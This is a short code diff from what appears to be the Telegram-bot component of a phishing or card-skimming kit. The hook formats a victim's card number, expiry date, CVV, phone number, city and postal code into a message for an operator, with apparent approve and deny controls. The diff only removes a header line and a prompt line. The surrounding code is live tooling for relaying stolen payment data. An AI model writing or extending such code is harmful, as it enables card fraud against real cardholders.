@@ -77,14 +77,11 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
 ├ 💳 <b>Card Number:</b> ${cardData.cardNumber}
 ├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
 └ 🔐 <b>CVV:</b> ${cardData.cvv}
-
-<b>Personal Info:</b>
 ├ 📞 <b>Phone:</b> ${cardData.phoneNumber}
 ├ 🏙️ <b>City:</b> ${cardData.city}
 └ 📮 <b>Postal Code:</b> ${cardData.postalCode}
 
 ━━━━━━━━━━━━━━━━━━━━━
-⚠️ <i>Click a button below</i>
       `;
 
       const keyboard = {
